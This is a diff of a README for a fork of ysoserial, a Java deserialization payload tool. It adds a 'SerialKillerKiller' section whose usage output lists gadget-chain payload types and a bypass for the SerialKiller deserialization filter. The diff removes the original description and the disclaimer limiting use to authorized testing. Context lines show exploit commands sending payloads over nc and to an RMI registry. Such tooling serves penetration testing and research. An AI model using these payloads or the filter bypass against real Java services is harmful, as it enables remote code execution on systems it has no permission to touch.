@@ -1,38 +1,53 @@
 
+# SerialKillerKiller
+
+## Usgae
+
+```shell
+$ java -cp target\ysoserial-0.0.6-SNAPSHOT-all.jar serialkillerkiller.Main
+SerialKiller Bypass Gadgets
+Usage: java -cp target\ysoserial-0.0.6-SNAPSHOT-all.jar serialkillerkiller.Main [payload type] [bypass type] '[command to execute]'
+        Available payload types:
+                AspectJWeaver [org.aspectj:aspectjweaver:1.9.2, commons-collections:commons-collections:3.2.2]
+                BeanShell1 [org.beanshell:bsh:2.0b5]
+                C3P0 [com.mchange:c3p0:0.9.5.2, com.mchange:mchange-commons-java:0.2.11]
+                Click1 [org.apache.click:click-nodeps:2.3.0, javax.servlet:javax.servlet-api:3.1.0]
+                Clojure [org.clojure:clojure:1.8.0]
+                CommonsBeanutils1 [commons-beanutils:commons-beanutils:1.9.2, commons-collections:commons-collections:3.1, commons-logging:commons-logging:1.2]
+                CommonsCollections1 [commons-collections:commons-collections:3.1]
+                CommonsCollections2 [org.apache.commons:commons-collections4:4.0]
+                CommonsCollections3 [commons-collections:commons-collections:3.1]
+                CommonsCollections4 [org.apache.commons:commons-collections4:4.0]
+                CommonsCollections5 [commons-collections:commons-collections:3.1]
+                CommonsCollections6 [commons-collections:commons-collections:3.1]
+                CommonsCollections7 [commons-collections:commons-collections:3.1]
+                FileUpload1 [commons-fileupload:commons-fileupload:1.3.1, commons-io:commons-io:2.4]
+                Groovy1 [org.codehaus.groovy:groovy:2.3.9]
+                Hibernate1 []
+                Hibernate2 []
+                JBossInterceptors1 [javassist:javassist:3.12.1.GA, org.jboss.interceptor:jboss-interceptor-core:2.0.0.Final, javax.enterprise:cdi-api:1.0-SP1, javax.interceptor:javax.interceptor-api:3.1, org.jboss.interceptor:jboss-interceptor-spi:2.0.0.Final, org.slf4j:slf4j-api:1.7.21]
+                JRMPClient []
+                JRMPListener []
+                JSON1 [net.sf.json-lib:json-lib:jar:jdk15:2.4, org.springframework:spring-aop:4.1.4.RELEASE, aopalliance:aopalliance:1.0, commons-logging:commons-logging:1.2, commons-lang:commons-lang:2.6, net.sf.ezmorph:ezmorph:1.0.6, commons-beanutils:commons-beanutils:1.9.2, org.springframework:spring-core:4.1.4.RELEASE, commons-collections:commons-collections:3.1]
+                JavassistWeld1 [javassist:javassist:3.12.1.GA, org.jboss.weld:weld-core:1.1.33.Final, javax.enterprise:cdi-api:1.0-SP1, javax.interceptor:javax.interceptor-api:3.1, org.jboss.interceptor:jboss-interceptor-spi:2.0.0.Final, org.slf4j:slf4j-api:1.7.21]
+                Jdk7u21 []
+                Jython1 [org.python:jython-standalone:2.5.2]
+                MozillaRhino1 [rhino:js:1.7R2]
+                MozillaRhino2 [rhino:js:1.7R2]
+                Myfaces1 []
+                Myfaces2 []
+                ROME [rome:rome:1.0]
+                Spring1 [org.springframework:spring-core:4.1.4.RELEASE, org.springframework:spring-beans:4.1.4.RELEASE]
+                Spring2 [org.springframework:spring-core:4.1.4.RELEASE, org.springframework:spring-aop:4.1.4.RELEASE, aopalliance:aopalliance:1.0, commons-logging:commons-logging:1.2]
+                URLDNS []
+                Vaadin1 [com.vaadin:vaadin-server:7.7.14, com.vaadin:vaadin-shared:7.7.14]
+                Wicket1 [org.apache.wicket:wicket-util:6.23.0, org.slf4j:slf4j-api:1.6.4]
+
+        Available bypass types:
+                Beanutils1 [commons-beanutils:commons-beanutils:1.0]
+```
+
 # ysoserial
-
-[![GitHub release](https://img.shields.io/github/downloads/frohoff/ysoserial/latest/total)](https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar)
-[![Travis Build Status](https://api.travis-ci.com/frohoff/ysoserial.svg?branch=master)](https://travis-ci.com/frohoff/ysoserial)
-[![Appveyor Build status](https://ci.appveyor.com/api/projects/status/a8tbk9blgr3yut4g/branch/master?svg=true)](https://ci.appveyor.com/project/frohoff/ysoserial/branch/master)
-
-A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.
-
-![logo](ysoserial.png)
-
-## Description
-
-Originally released as part of AppSecCali 2015 Talk
-["Marshalling Pickles: how deserializing objects will ruin your day"](
-        https://frohoff.github.io/appseccali-marshalling-pickles/)
-with gadget chains for Apache Commons Collections (3.x and 4.x), Spring Beans/Core (4.x), and Groovy (2.3.x).
-Later updated to include additional gadget chains for
-[JRE <= 1.7u21](https://gist.github.com/frohoff/24af7913611f8406eaf3) and several other libraries.
-
-__ysoserial__ is a collection of utilities and property-oriented programming "gadget chains" discovered in common java
-libraries that can, under the right conditions, exploit Java applications performing __unsafe deserialization__ of
-objects. The main driver program takes a user-specified command and wraps it in the user-specified gadget chain, then
-serializes these objects to stdout. When an application with the required gadgets on the classpath unsafely deserializes
-this data, the chain will automatically be invoked and cause the command to be executed on the application host.
-
-It should be noted that the vulnerability lies in the application performing unsafe deserialization and NOT in having
-gadgets on the classpath.
-
-## Disclaimer
-
-This software has been created purely for the purposes of academic research and
-for the development of effective defensive techniques, and is not intended to be
-used to attack systems except where explicitly authorized. Project maintainers
-are not responsible or liable for misuse of the software. Use responsibly.
 
 ## Usage
 
@@ -96,33 +111,3 @@ $ nc 10.10.10.10 1099 < groovypayload.bin
 
 $ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
 ```
-
-## Installation
-
-[![GitHub release](https://img.shields.io/github/downloads/frohoff/ysoserial/latest/total)](https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar)
-
-Download the [latest release jar](https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar) from GitHub releases.
-
-## Building
-
-Requires Java 1.7+ and Maven 3.x+
-
-```mvn clean package -DskipTests```
-
-## Code Status
-
-[![Build Status](https://travis-ci.org/frohoff/ysoserial.svg?branch=master)](https://travis-ci.org/frohoff/ysoserial)
-[![Build status](https://ci.appveyor.com/api/projects/status/a8tbk9blgr3yut4g/branch/master?svg=true)](https://ci.appveyor.com/project/frohoff/ysoserial/branch/master)
-
-## Contributing
-
-1. Fork it
-2. Create your feature branch (`git checkout -b my-new-feature`)
-3. Commit your changes (`git commit -am 'Add some feature'`)
-4. Push to the branch (`git push origin my-new-feature`)
-5. Create new Pull Request
-
-## See Also
-* [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet): info on vulnerabilities, tools, blogs/write-ups, etc.
-* [marshalsec](https://github.com/frohoff/marshalsec): similar project for various Java deserialization formats/libraries
-* [ysoserial.net](https://github.com/pwntester/ysoserial.net): similar project for .NET deserialization
